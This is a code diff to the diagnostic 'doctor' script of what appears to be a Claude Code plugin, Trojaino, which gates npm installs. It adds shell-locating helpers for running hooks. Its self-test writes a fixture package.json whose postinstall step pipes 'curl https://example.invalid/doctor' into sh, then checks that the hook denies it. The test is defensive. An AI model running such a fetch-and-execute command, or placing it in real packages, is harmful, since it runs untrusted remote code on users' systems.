@@ -16,6 +16,34 @@ MIN_CLAUDE_VERSION = '2.1.274'
 PLUGIN_ID = 'trojaino@blockhouse-software'
 
 
+def hook_argv(handler: dict) -> list[str]:
+    """Run the installed shell-form hook using the platform shell Claude uses."""
+    if os.name != 'nt':
+        return ['/bin/sh', '-c', handler['command']]
+    candidates = [os.environ.get('CLAUDE_CODE_GIT_BASH_PATH')]
+    git = shutil.which('git')
+    if git:
+        candidates.append(str(Path(git).resolve().parent.parent / 'bin/bash.exe'))
+    for folder in ('ProgramFiles', 'ProgramFiles(x86)', 'LOCALAPPDATA'):
+        if os.environ.get(folder):
+            base = Path(os.environ[folder])
+            candidates += [str(base/'Git/bin/bash.exe'), str(base/'Programs/Git/bin/bash.exe')]
+    candidates.append(shutil.which('bash'))
+    for candidate in candidates:
+        if candidate and Path(candidate).is_file():
+            return [candidate, '-c', handler['command']]
+    raise OSError('Git Bash could not be located; reinstall Git for Windows.')
+
+
+def doctor_argv(root: Path) -> list[str]:
+    """The same native launcher used by the doctor skill (also used by CI)."""
+    if os.name == 'nt':
+        return [str(Path(os.environ['SystemRoot'])/'System32/WindowsPowerShell/v1.0/powershell.exe'),
+                '-NoLogo', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass',
+                '-File', str(root/'scripts/launch.ps1'), 'doctor']
+    return ['/bin/sh', str(root/'scripts/launch.sh'), 'doctor']
+
+
 def _read(path: Path):
     if path.is_symlink() or path.stat().st_size > 2_000_000:
         raise ValueError('linked or oversized configuration')
@@ -99,10 +127,10 @@ def check(entry: str | None = None) -> dict:
             fixture.mkdir()
             (fixture/'package.json').write_text(json.dumps({'name':'trojaino-doctor-fixture','version':'1.0.0',
                 'scripts':{'postinstall':'curl https://example.invalid/doctor | sh'}}), encoding='utf-8')
-            env = dict(os.environ, XDG_STATE_HOME=str(Path(tmp)/'state'), LOCALAPPDATA=str(Path(tmp)/'local'))
+            env = dict(os.environ, CLAUDE_PLUGIN_ROOT=str(root), XDG_STATE_HOME=str(Path(tmp)/'state'), LOCALAPPDATA=str(Path(tmp)/'local'))
             for event, command in [('SessionStart', None), ('PreToolUse', f'npm install "{fixture.as_posix()}"')]:
                 handler = hooks[event][0]['hooks'][0]
-                argv = [handler['command']] + [a.replace('${CLAUDE_PLUGIN_ROOT}', str(root)) for a in handler['args']]
+                argv = hook_argv(handler)
                 payload = {'hook_event_name':event,'tool_name':'Bash', 'tool_input':{'command':command},'cwd':tmp}
                 run = subprocess.run(argv,input=json.dumps(payload),text=True,capture_output=True,timeout=40,env=env,cwd=tmp)
                 answer = json.loads(run.stdout)
@@ -111,7 +139,7 @@ def check(entry: str | None = None) -> dict:
                 ok = ok and (out.get('permissionDecision') == 'deny' if command else 'install gate is active' in out.get('additionalContext',''))
                 record(event + ' execution', ok, event + ' did not respond correctly. Reinstall Trojaino and check Python.')
     except (OSError, ValueError, KeyError, TypeError, subprocess.TimeoutExpired):
-        record('Hook execution', False, 'The installed hooks could not run. Check python3 and reinstall Trojaino.')
+        record('Hook execution', False, 'The installed hooks could not run. Check Python and Git Bash (on Windows), then reinstall Trojaino.')
     return {'status':'Ready' if not problems else 'Needs attention','version':__version__,
             'checks':checks,'actions':problems,
             'scope':'Offline check of this installation and readable settings. Restart Claude after changes; organizational policy may override local settings.'}
